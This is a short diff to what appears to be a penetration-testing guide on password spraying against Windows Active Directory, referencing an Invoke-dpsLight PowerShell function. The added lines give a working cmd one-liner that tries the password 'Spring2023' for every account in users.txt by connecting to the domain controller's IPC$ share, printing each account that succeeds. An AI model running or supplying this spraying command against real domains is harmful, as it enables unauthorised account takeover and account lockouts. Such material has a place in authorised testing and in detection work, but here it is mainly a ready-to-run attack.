@@ -77,3 +77,8 @@ Invoke-dpsLight "Spring2023" all-ab-users.txt 2 *>&1 | tee -Append out.txt
 
 This method using a different method which generates different Windows event IDs. It is also much slower.
 
+This example uses a password of Spring2023 against a list of users called users.txt in the current directory.
+
+```cmd
+@FOR /F "delims=" %n in (users.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2023" 1>NUL 2>&1 && @echo [*] %n:"Spring2023" && @net use /delete %logonserver%\IPC$ > NUL
+```
